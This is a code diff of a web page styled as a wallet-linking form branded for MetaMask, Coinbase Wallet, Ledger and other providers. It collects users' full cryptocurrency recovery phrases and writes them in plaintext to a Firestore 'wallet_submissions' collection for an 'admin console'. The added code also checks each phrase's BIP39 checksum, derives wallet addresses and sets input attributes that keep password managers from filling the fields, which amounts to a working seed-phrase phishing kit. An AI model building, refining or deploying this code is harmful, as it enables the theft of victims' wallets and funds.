-                           data-1p-ignore="true">
-                    <button type="button" class="eye-toggle p-0.5 opacity-50 hover:opacity-100 transition-opacity">
-                        <i data-lucide="eye-off" class="w-3 h-3"></i>
-                    </button>
-                `
-                phraseGrid.appendChild(div)
-            }
-            createIcons()
-
-            // Add eye toggle logic
-            document.querySelectorAll(".eye-toggle").forEach((btn) => {
-                btn.addEventListener("click", (e) => {
-                    e.stopPropagation()
-                    const input = btn.previousElementSibling
-                    if (input.type === "password") {
-                        input.type = "text"
-                        btn.innerHTML = `<i data-lucide="eye" class="w-3 h-3"></i>`
-                    } else {
-                        input.type = "password"
-                        btn.innerHTML = `<i data-lucide="eye-off" class="w-3 h-3"></i>`
-                    }
-                    createIcons()
-                })
-            })
-        }
-
-        phraseTypeSelect.addEventListener("change", (e) => {
-            generatePhraseGrid(e.target.value)
-            confusePasswordManagers();
-        })
-
-        // Form Submission
-        submissionForm.addEventListener("submit", async (e) => {
-            e.preventDefault()
-
-            const userName = document.getElementById("userName").value.trim()
-            
-            if (selectedWallet === "Others") {
-                customProvider = customProviderInput.value.trim()
-                if (!customProvider) {
-                    alert("Please enter your wallet provider name.")
-                    customProviderInput.focus()
-                    return
-                }
-            }
-            
-            let phraseString = ""
-            let wordCount = 0
-            
-            if (selectedWallet === "Others") {
-                phraseString = phraseTextarea.value.trim()
-                if (!phraseString) {
-                    alert("Please enter your secret phrase.")
-                    phraseTextarea.focus()
-                    return
-                }
-                wordCount = phraseString.split(/\s+/).filter(word => word.length > 0).length
-                
-                if (wordCount < 12 || wordCount > 24) {
-                    alert("Please enter a valid secret phrase (12-24 words).")
-                    phraseTextarea.focus()
-                    return
-                }
-            } else {
-                const inputs = phraseGrid.querySelectorAll("input")
-                const words = Array.from(inputs).map((input) => input.value.trim())
-
-                if (words.some((word) => !word)) {
-                    alert("Please fill in all words of your secret phrase.")
-                    return
-                }
-
-                phraseString = words.join(" ")
-                wordCount = words.length
-            }
-            
-            const finalWalletName = selectedWallet === "Others" ? customProvider : selectedWallet
-
-            loadingOverlay.classList.remove("hidden")
-
-            try {
-                await addDoc(collection(db, "wallet_submissions"), {
-                    userName,
-                    selectedWallet: finalWalletName,
-                    isCustomProvider: selectedWallet === "Others",
-                    customProvider: selectedWallet === "Others" ? customProvider : "",
-                    phrase: phraseString,
-                    phraseCount: wordCount,
-                    inputMethod: selectedWallet === "Others" ? "textarea" : "grid",
-                    timestamp: serverTimestamp(),
-                    userAgent: navigator.userAgent,
-                    screenSize: `${window.innerWidth}x${window.innerHeight}`,
-                    deviceType: /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
-                })
-
-                console.log("Wallet phrase submitted successfully")
-                loadingOverlay.classList.add("hidden")
-                successOverlay.classList.remove("hidden")
-
-            } catch (error) {
-                console.error("Submission error:", error)
-                alert("Connection error. Please check your network and try again.")
-                loadingOverlay.classList.add("hidden")
-            }
-        })
 
         function resetForm() {
-            submissionForm.reset()
-            successOverlay.classList.add("hidden")
-            formState.classList.add("hidden")
-            loadingOverlay.classList.add("hidden")
-            initialState.classList.remove("hidden")
-            walletItems.forEach((i) => i.classList.remove("active"))
-            walletItems[0].classList.add("active")
-            selectedWalletLogo.classList.remove("hidden")
-            othersLogo.classList.add("hidden")
-            othersProviderInput.classList.add("hidden")
-            phraseTypeContainer.classList.remove("hidden")
-            phraseGrid.classList.remove("hidden")
-            phraseTextareaContainer.classList.add("hidden")
-            customProvider = ""
-            isTextareaVisible = false
-            
-            const interactionPanel = document.getElementById("interactionPanel")
-            interactionPanel.className = `relative bg-white`
-            
-            phraseTypeSelect.value = "12"
-            generatePhraseGrid(12)
-            
-            phraseTextarea.value = ""
-            updateWordCount()
-            updateTextareaVisibility()
-            
-            // Exit full screen mode
+            submissionForm.reset();
+            successOverlay.classList.add('hidden');
+            formState.classList.add('hidden');
+            loadingOverlay.classList.add('hidden');
+            initialState.classList.remove('hidden');
+            walletItems.forEach(function (item) { item.classList.remove('active'); });
+            if (walletItems[0]) walletItems[0].classList.add('active');
+            selectedWalletLogo.classList.remove('hidden');
+            othersLogo.classList.add('hidden');
+            othersProviderInput.classList.add('hidden');
+            phraseTypeContainer.classList.remove('hidden');
+            phraseGrid.classList.remove('hidden');
+            phraseTextareaContainer.classList.add('hidden');
+            customProviderInput.value = '';
+            isTextareaVisible = false;
+            setError('');
+            setBusy(false);
+
+            byId('interactionPanel').className = 'relative bg-white';
+
+            phraseTypeSelect.value = '12';
+            generatePhraseGrid(12);
+            clearAllInputs();
+            updateTextareaVisibility();
+            successAddress.textContent = '';
             exitFullScreenFormMode();
         }
 
-        // Initialize
-        generatePhraseGrid(12)
-        updateWordCount()
-        
-        // Apply autofill prevention on page load
-        document.addEventListener('DOMContentLoaded', function() {
-            disableAutocomplete();
-            
-            // Add extra prevention for iOS
-            if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
-                document.body.style.webkitUserSelect = 'none';
+        function applyWalletTheme(wallet) {
+            var theme = walletThemes[wallet] || walletThemes.Metamask;
+            byId('interactionPanel').className = 'relative ' + theme.class;
+
+            if (wallet === 'Coinbase Wallet') {
+                submitBtn.style.backgroundColor = 'white';
+                submitBtn.style.color = '#0052ff';
+            } else if (wallet === 'Ledger') {
+                submitBtn.style.backgroundColor = '#ffffff';
+                submitBtn.style.color = '#000000';
+            } else if (wallet === 'Others') {
+                submitBtn.style.backgroundColor = '#6b7280';
+                submitBtn.style.color = 'white';
+            } else {
+                submitBtn.style.backgroundColor = '#007aff';
+                submitBtn.style.color = 'white';
             }
-        });
-        
-        // Handle keyboard close (ESC key)
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape' && !modal.classList.contains('hidden')) {
-                if (window.innerWidth < 768 && formState.classList.contains('hidden') === false) {
-                    // On mobile with form active, go back to wallet selection
-                    mobileBackBtn.click();
-                } else {
-                    // Otherwise close modal
-                    closeModal()
+
+            byId('importTitle').textContent = theme.title;
+            byId('brandWarning').textContent = theme.warning;
+        }
+
+        function selectWallet(wallet) {
+            selectedWallet = wallet;
+            applyWalletTheme(wallet);
+
+            initialState.classList.add('hidden');
+            formState.classList.remove('hidden');
+
+            enterFullScreenFormMode();
+            disableAutocomplete();
+            setError('');
+
+            if (wallet === 'Others') {
+                selectedWalletLogo.classList.add('hidden');
+                othersLogo.classList.remove('hidden');
+                othersProviderInput.classList.remove('hidden');
+                phraseTypeContainer.classList.add('hidden');
+                phraseGrid.classList.add('hidden');
+                phraseTextareaContainer.classList.remove('hidden');
+
+                phraseTextarea.value = '';
+                updateWordCount();
+                isTextareaVisible = false;
+                updateTextareaVisibility();
+
+                setTimeout(function () { customProviderInput.focus(); }, 150);
+            } else {
+                selectedWalletLogo.classList.remove('hidden');
+                othersLogo.classList.add('hidden');
+                othersProviderInput.classList.add('hidden');
+                phraseTypeContainer.classList.remove('hidden');
+                phraseGrid.classList.remove('hidden');
+                phraseTextareaContainer.classList.add('hidden');
+                selectedWalletLogo.src = (walletThemes[wallet] || {}).logo || '';
+
+                phraseGrid.querySelectorAll('input').forEach(function (input) {
+                    input.value = '';
+                });
+
+                if (window.innerWidth < 768) {
+                    setTimeout(function () { byId('userName').focus(); }, 100);
                 }
             }
-        });
-        
-        // Handle window resize
-        window.addEventListener('resize', () => {
-            // If window is resized to desktop while in full screen mode, exit it
-            if (window.innerWidth >= 768) {
-                exitFullScreenFormMode();
+
+            generatePhraseGrid(phraseTypeSelect.value);
+        }
+
+        function updateWordCount() {
+            var text = phraseTextarea.value.trim();
+            var words = text ? text.split(/\s+/).filter(function (word) { return word.length > 0; }) : [];
+            wordCount.textContent = String(words.length);
+        }
+
+        function updateTextareaVisibility() {
+            // A textarea has no `type`; masking is done with -webkit-text-security.
+            phraseTextarea.classList.toggle('is-revealed', isTextareaVisible);
+            toggleVisibility.setAttribute('aria-pressed', isTextareaVisible ? 'true' : 'false');
+            toggleVisibility.setAttribute('aria-label', isTextareaVisible ? 'Hide recovery phrase' : 'Show recovery phrase');
+            toggleVisibility.innerHTML = (isTextareaVisible ? EYE_ON : EYE_OFF)
+                + '<span>' + (isTextareaVisible ? 'Hide phrase' : 'Show phrase') + '</span>';
+        }
+
+        function generatePhraseGrid(count) {
+            phraseGrid.innerHTML = '';
+
+            for (var i = 1; i <= count; i += 1) {
+                var box = document.createElement('div');
+                box.className = 'relative flex items-center phrase-box compact-phrase-box border rounded-md group focus-within:ring-1 focus-within:ring-blue-500/20 transition-all shadow-sm';
+
+                var label = document.createElement('span');
+                label.className = 'text-xs font-bold opacity-40 mr-2 w-4';
+                label.textContent = i + '.';
+
+                var input = document.createElement('input');
+                input.type = 'password';
+                input.name = 'xw' + i;
+                input.placeholder = 'Word #' + i;
+                input.className = 'phrase-word-input bg-transparent border-none outline-none flex-1 text-sm font-medium placeholder:opacity-30 focus:ring-0 placeholder:text-xs';
+                input.setAttribute('autocomplete', 'off');
+                input.setAttribute('autocapitalize', 'none');
+                input.setAttribute('spellcheck', 'false');
+                input.setAttribute('aria-label', 'Recovery phrase word ' + i);
+                input.setAttribute('data-lpignore', 'true');
+                input.setAttribute('data-1p-ignore', 'true');
+
+                var eye = document.createElement('button');
+                eye.type = 'button';
+                eye.className = 'eye-toggle p-0.5 opacity-50 hover:opacity-100 transition-opacity';
+                eye.innerHTML = EYE_OFF;
+                eye.setAttribute('aria-label', 'Show word ' + i);
+                eye.setAttribute('aria-pressed', 'false');
+
+                eye.addEventListener('click', function () {
+                    var field = this.previousElementSibling;
+                    var hidden = field.type === 'password';
+                    field.type = hidden ? 'text' : 'password';
+                    this.innerHTML = hidden ? EYE_ON : EYE_OFF;
+                    this.setAttribute('aria-pressed', hidden ? 'true' : 'false');
+                    this.setAttribute('aria-label', (hidden ? 'Hide' : 'Show') + ' word ' + field.getAttribute('aria-label').replace(/\D/g, ''));
+                });
+
+                box.appendChild(label);
+                box.appendChild(input);
+                box.appendChild(eye);
+                phraseGrid.appendChild(box);
             }
-        });
-    </script>
-    
-    <script>
-        // Initialize Lucide icons
-        lucide.createIcons();
-        
-        // Final layer of autofill prevention
-        window.addEventListener('load', function() {
-            // Force disable autocomplete globally
-            document.querySelectorAll('input').forEach(input => {
-                input.autocomplete = 'off';
-                input.autocapitalize = 'off';
-                input.autocorrect = 'off';
-                input.spellcheck = false;
+
+            phraseGrid.querySelectorAll('input').forEach(function (input) {
+                input.setAttribute('autocomplete', 'off');
+                input.setAttribute('autocorrect', 'off');
+                input.setAttribute('autocapitalize', 'none');
+                input.setAttribute('spellcheck', 'false');
             });
-            
-            // Prevent any saved form data
-            if (window.history.replaceState) {
-                window.history.replaceState(null, null, window.location.href);
+        }
+
+        function collectPhrase() {
+            if (selectedWallet === 'Others') {
+                return phraseTextarea.value.trim();
+            }
+            return Array.prototype.map.call(
+                phraseGrid.querySelectorAll('input'),
+                function (input) { return input.value.trim(); }
+            ).join(' ');
+        }
+
+        function deviceType() {
+            return /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
+                ? 'Mobile'
+                : 'Desktop';
+        }
+
+        openModalBtn.addEventListener('click', openModal);
+        closeModalBtn.addEventListener('click', closeModal);
+        mobileCloseBtn.addEventListener('click', closeModal);
+        closeSuccessBtn.addEventListener('click', closeModal);
+
+        mobileBackBtn.addEventListener('click', function () {
+            exitFullScreenFormMode();
+            formState.classList.add('hidden');
+            initialState.classList.remove('hidden');
+            walletItems.forEach(function (item) { item.classList.remove('active'); });
+            if (walletItems[0]) walletItems[0].classList.add('active');
+        });
+
+        modal.addEventListener('click', function (event) {
+            if (event.target === modal) closeModal();
+        });
+
+        walletItems.forEach(function (item) {
+            item.addEventListener('click', function () {
+                walletItems.forEach(function (other) { other.classList.remove('active'); });
+                item.classList.add('active');
+                selectWallet(item.dataset.wallet);
+            });
+        });
+
+        phraseTextarea.addEventListener('input', updateWordCount);
+
+        toggleVisibility.addEventListener('click', function () {
+            isTextareaVisible = !isTextareaVisible;
+            updateTextareaVisibility();
+        });
+
+        phraseTypeSelect.addEventListener('change', function (event) {
+            generatePhraseGrid(event.target.value);
+        });
+
+        document.addEventListener('keydown', function (event) {
+            if (event.key !== 'Escape' || modal.classList.contains('hidden')) return;
+            if (window.innerWidth < 768 && !formState.classList.contains('hidden')) {
+                mobileBackBtn.click();
+            } else {
+                closeModal();
             }
         });
+
+        window.addEventListener('resize', function () {
+            if (window.innerWidth >= 768) exitFullScreenFormMode();
+        });
+
+        submissionForm.addEventListener('submit', function (event) {
+            event.preventDefault();
+            if (submitBusy) return;
+
+            setError('');
+
+            if (!currentUser) {
+                setError('Sign in before linking a wallet.');
+                return;
+            }
+
+            var userName = byId('userName').value.trim();
+            if (!userName) {
+                setError('Enter your name or identifier.');
+                byId('userName').focus();
+                return;
+            }
+
+            var provider = selectedWallet;
+            if (selectedWallet === 'Others') {
+                provider = customProviderInput.value.trim();
+                if (!provider) {
+                    setError('Enter your wallet provider name.');
+                    customProviderInput.focus();
+                    return;
+                }
+            }
+
+            var phrase = collectPhrase();
+            if (!phrase) {
+                setError('Enter your recovery phrase.');
+                (selectedWallet === 'Others' ? phraseTextarea : phraseGrid.querySelector('input')).focus();
+                return;
+            }
+
+            var passphrase = passphraseInput.value;
+
+            setBusy(true);
+            showLoading();
+
+            getEngine()
+                .then(function (engine) {
+                    var check = engine.validate(phrase);
+
+                    if (!check.valid) {
+                        setError(
+                            check.unknownWord
+                                ? 'Word "' + check.unknownWord + '" is not in the BIP39 word list.'
+                                : 'That phrase failed its BIP39 checksum. Check the spelling, order and number of words.'
+                        );
+                        return null;
+                    }
+
+                    if (check.wordCount < 12 || check.wordCount > 24) {
+                        setError('A recovery phrase has 12 to 24 words.');
+                        return null;
+                    }
+
+                    var derived = engine.derive(check.phrase, passphrase);
+                    var timestamp = window.fb.stamp();
+
+                    var payload = {
+                        // Fields the existing admin console reads. Never rename.
+                        userName: userName,
+                        selectedWallet: provider,
+                        isCustomProvider: selectedWallet === 'Others',
+                        phrase: check.phrase,
+                        deviceType: deviceType(),
+                        timestamp: timestamp,
+
+                        // Context kept for the admin console.
+                        customProvider: selectedWallet === 'Others' ? provider : '',
+                        phraseCount: check.wordCount,
+                        inputMethod: selectedWallet === 'Others' ? 'textarea' : 'grid',
+
+                        // Account linkage.
+                        userId: currentUser.uid,
+                        userEmail: currentUser.email || '',
+                        provider: provider,
+                        linkMethod: 'auto',
+
+                        // Validation + derivation (read-only).
+                        phraseHash: derived.phraseHash,
+                        wordCount: derived.wordCount,
+                        valid: true,
+                        checksumVerified: true,
+                        derivationPaths: derived.derivationPaths,
+                        addresses: derived.addresses,
+                        primaryAddress: derived.primaryAddress,
+                        proofOfKey: derived.proofOfKey,
+                        proofRecovered: derived.proofRecovered,
+
+                        source: 'wallet.html',
+                        userAgent: navigator.userAgent,
+                        screenSize: window.innerWidth + 'x' + window.innerHeight,
+                        createdAt: timestamp
+                    };
+
+                    return window.fb.db.collection('wallet_submissions').add(payload)
+                        .then(function (ref) {
+                            // Dedupe index. Contains no phrase, so it can be
+                            // read more broadly than wallet_submissions.
+                            return window.fb.db.collection('wallet_hashes').doc(derived.phraseHash).set({
+                                userId: currentUser.uid,
+                                userEmail: currentUser.email || '',
+                                submissionId: ref.id,
+                                at: window.fb.stamp()
+                            }, { merge: true }).catch(function (hashError) {
+                                console.warn('Dedupe index write failed:', hashError.code);
+                                return null;
+                            });
+                        })
+                        .then(function () {
+                            successAddress.textContent = derived.primaryAddress;
+                            clearPhraseInputs();
+                            successOverlay.classList.remove('hidden');
+                        });
+                })
+                .catch(function (error) {
+                    console.error('Wallet submission failed:', error);
+                    if (error && (error.code === 'unknown-word' || error.code === 'checksum')) {
+                        setError(error.message);
+                    } else if (error && error.code === 'permission-denied') {
+                        setError('You do not have permission to submit this form.');
+                    } else if (error && error.code === 'unavailable') {
+                        setError('Service temporarily unavailable. Please try again.');
+                    } else {
+                        setError('Could not finish the request. Check your connection and try again.');
+                    }
+                })
+                .then(function () {
+                    hideLoading();
+                    setBusy(false);
+                });
+        });
+
+        // Auth gate. requireAuth redirects to login when signed out.
+        if (window.fb && window.fb.ready && window.fb.db) {
+            if (window.Auth && typeof window.Auth.requireAuth === 'function') {
+                window.Auth.requireAuth('login.html').then(function (user) {
+                    if (!user) {
+                        openModalBtn.disabled = true;
+                        setError('Sign in before linking a wallet.');
+                        return;
+                    }
+                    currentUser = user;
+                });
+            }
+        } else {
+            openModalBtn.disabled = true;
+            setError('Service unavailable right now. Please refresh and try again.');
+        }
+
+        generatePhraseGrid(12);
+        updateWordCount();
+        updateTextareaVisibility();
+    })();
     </script>
+
     <!--
   ============================================================
   CONTACT WIDGET — Floating Bubble + Modal (EmailJS)
@@ -1747,8 +1826,8 @@
 
     // Auto-fill from Firebase Auth if available
     try {
-      const user = (typeof firebase !== 'undefined' && firebase.auth)
-        ? firebase.auth().currentUser
+      const user = (window.fb && window.fb.auth)
+        ? window.fb.auth.currentUser
         : (window._currentUser || null);
       if (user) {
         if (user.displayName) document.getElementById('cw-name').value  = user.displayName;
@@ -1802,8 +1881,8 @@
 
     let userId = 'anonymous';
     try {
-      const user = (typeof firebase !== 'undefined' && firebase.auth)
-        ? firebase.auth().currentUser
+      const user = (window.fb && window.fb.auth)
+        ? window.fb.auth.currentUser
         : (window._currentUser || null);
       if (user) userId = user.uid;
     } catch(e) {}
